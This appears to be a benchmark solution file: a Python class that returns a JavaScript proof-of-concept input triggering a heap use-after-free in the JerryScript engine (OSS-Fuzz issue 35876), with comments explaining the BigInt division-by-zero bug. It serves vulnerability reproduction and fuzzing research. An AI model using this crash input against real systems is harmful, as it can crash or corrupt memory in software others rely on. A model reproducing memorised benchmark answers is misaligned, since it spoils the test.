class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC targets a Heap Use-After-Free vulnerability in JerryScript (OSS-Fuzz issue 35876).
        # The vulnerability occurs in the vm_op_compound_assignment_value opcode when performing
        # compound division by zero on a BigInt. The left-hand side variable is freed before the
        # division throws, leading to a UAF if the variable is accessed in the catch block.
        return b"function f(){var a=1n;try{a/=0n}catch(e){a+1n}}f()\n"